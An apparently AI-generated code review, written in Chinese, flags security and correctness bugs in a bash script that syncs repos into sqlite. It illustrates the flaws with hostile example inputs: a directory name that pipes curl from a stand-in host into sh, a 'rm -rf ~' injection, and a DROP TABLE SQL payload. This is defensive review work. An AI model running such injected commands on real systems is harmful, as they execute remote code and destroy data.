<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

此 PR 新增一支 `sandbox/repo_sync.sh`，用於批次同步多個 repo 並將結果寫入 sqlite 供維運報表使用。整體有數個明確的安全與正確性問題：`run_hook` 使用 `eval` 執行路徑可控的 hook、`sync_one` 直接以字串拼接 SQL 造成注入、`cleanup_cache` 對 `$ROOT` 未驗證即 `rm -rf`、以及 `cd` 未檢查失敗與 `ls` 解析目錄名等。最該優先修的是 `eval` 與 SQL 注入，以及 `rm -rf` 的破壞性風險。

### Findings（8 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/repo_sync.sh:56` | run_hook 使用 eval 執行可控路徑，造成指令注入 | 0.90 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:47` | SQL 以字串拼接，repo/branch 名稱可造成注入 | 0.90 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:62` | cleanup_cache 對未驗證的 $ROOT 執行 rm -rf | 0.85 |
| ⚠️ | Major | `sandbox/repo_sync.sh:33` | cd 失敗未檢查，後續 git 指令會在錯誤目錄執行 | 0.80 |
| ⚠️ | Major | `sandbox/repo_sync.sh:87` | 以 ls 解析目錄名稱，遇空白或特殊字元會出錯 | 0.75 |
| ⚠️ | Major | `sandbox/repo_sync.sh:37` | git checkout 使用未加引號的 $BRANCH | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:68` | summarize 的 total 計數與實際寫入筆數不一致 | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:71` | summarize 截斷 log 後 total 與內容不符 | 0.65 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:56</code> run_hook 使用 eval 執行可控路徑，造成指令注入</summary>

`eval "$hook $repo"` 會把 `$hook`（來自 `$ROOT/.hooks/post-sync`）與 `$repo`（來自目錄名稱）當成 shell 程式碼重新解析。若 repo 目錄名稱含有 shell metacharacter（例如 `foo; rm -rf ~` 或 `$(...)`），或 `$ROOT` 指向的 `.hooks/post-sync` 內容被替換，就會執行任意指令。具體情境：攻擊者在 `$ROOT` 下建立名為 `x;curl evil|sh` 的目錄，迴圈傳入 `run_hook "x;curl evil|sh"` 即觸發。建議改為 `"$hook" "$repo"`（不經 eval），並以 `--` 分隔參數。

**判斷依據**：diff 中 run_hook 內唯一一行 `eval "$hook $repo"`，$hook 與 $repo 皆為外部可控字串。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:47</code> SQL 以字串拼接，repo/branch 名稱可造成注入</summary>

`INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, ...)` 直接將 `$name`（目錄名稱）與 `$BRANCH` 拼進 SQL。目錄名稱若含單引號（例如 `a'); DROP TABLE runs;--`）即可注入任意 SQL。雖然 `$BRANCH` 有 regex 白名單，但 `$name` 完全未過濾。建議改用參數化：`sqlite3 "$DB" "INSERT INTO runs VALUES(?1,?2,?3,datetime('now'))" "$name" "$BRANCH" "$ahead"`，或至少對 `$name` 做嚴格驗證。

**判斷依據**：diff 中 sync_one 內該 INSERT 行，$name 來自 basename 未經任何驗證。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:62</code> cleanup_cache 對未驗證的 $ROOT 執行 rm -rf</summary>

`rm -rf "$ROOT"/.cache/*` 在 `$ROOT` 為空或為 `/` 等危險值時會刪除非預期路徑。`main` 只檢查 `$BRANCH` 是否為空，未檢查 `$ROOT`；若使用者誤傳 `ROOT=/` 或 `ROOT=`（空字串展開為 `/.cache/*`），將造成大範圍刪除。建議在 main 開頭驗證 `$ROOT` 非空、存在且為目錄，並避免對根目錄操作。

**判斷依據**：diff 中 cleanup_cache 內唯一一行 rm -rf，main 僅檢查 BRANCH 未檢查 ROOT。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:33</code> cd 失敗未檢查，後續 git 指令會在錯誤目錄執行</summary>

`cd "$dir"` 未檢查回傳值。若目錄在 `ls` 與 `cd` 之間被刪除或無權限，`cd` 失敗後 shell 仍留在上一個目錄，接著的 `git fetch/checkout/merge` 會作用在錯誤的 repo 上，可能污染其他 repo 或寫入錯誤的 `$name` 資料。建議改為 `cd "$dir" || { echo "cd failed: $dir" >>"$LOG"; return 1; }`。

**判斷依據**：diff 中 sync_one 內 `cd "$dir"` 後直接接 git 指令，無錯誤處理。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:87</code> 以 ls 解析目錄名稱，遇空白或特殊字元會出錯</summary>

`for d in $(ls "$ROOT")` 依空白/tab/換行做 word splitting，且會對檔名做 glob 展開。若 repo 目錄名稱含空白（如 `my repo`），會被拆成兩個迭代，導致 `$ROOT/my` 不存在而 `continue`，該 repo 被靜默略過；含 `*` 等字元則可能展開成非預期路徑。建議改用 `for target in "$ROOT"/*/; do ...` 或 `find "$ROOT" -mindepth 1 -maxdepth 1 -type d -print0` 搭配 `while IFS= read -r -d ''`。

**判斷依據**：diff 中 main 內該 for 行，使用未加引號的 command substitution。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:37</code> git checkout 使用未加引號的 $BRANCH</summary>

`git checkout $BRANCH` 未加引號，雖然開頭 regex 已限制字元集，但未加引號仍會受 word splitting/glob 影響（例如 branch 名稱含 `*` 時可能被展開）。此外 `git merge --ff-only "origin/$BRANCH"` 若 checkout 失敗（例如本地有衝突變更）仍會繼續執行，導致後續 `ahead` 計算與 DB 寫入基於錯誤狀態。建議加引號 `git checkout "$BRANCH"` 並檢查各步驟回傳值。

**判斷依據**：diff 中 sync_one 內 `git checkout $BRANCH` 未加引號，且未檢查回傳值。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:68</code> summarize 的 total 計數與實際寫入筆數不一致</summary>

`total=$(grep -c . "$LOG" ...)` 計算的是 log 檔中非空行數，但 log 同時包含 `git fetch/checkout/merge` 的 stderr 輸出，並非「同步筆數」。因此輸出的「本次同步共 N 筆紀錄」會誤導維運報表。建議改為在迴圈中累加成功同步的 repo 數，或直接查詢 DB 的 `SELECT COUNT(*) FROM runs`。

**判斷依據**：diff 中 summarize 內該行，$LOG 同時被 git 指令的 stderr 寫入。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:71</code> summarize 截斷 log 後 total 與內容不符</summary>

當 `total > 100` 時，`tail -100 "$LOG" > "$LOG.trimmed"` 只保留最後 100 行，但回報的 `$total` 仍是截斷前的行數，且 `$LOG.trimmed` 若已存在會被覆寫。這會讓報表數字與實際保留的 log 不一致。建議先記錄原始 total 再截斷，或明確標示「已截斷」。

**判斷依據**：diff 中 summarize 內截斷邏輯，total 於截斷前計算。

</details>

---

<sub>model `deepseek-flash` ｜ prompt tokens 2512 (cache hit 1280) ｜ completion tokens 2031</sub>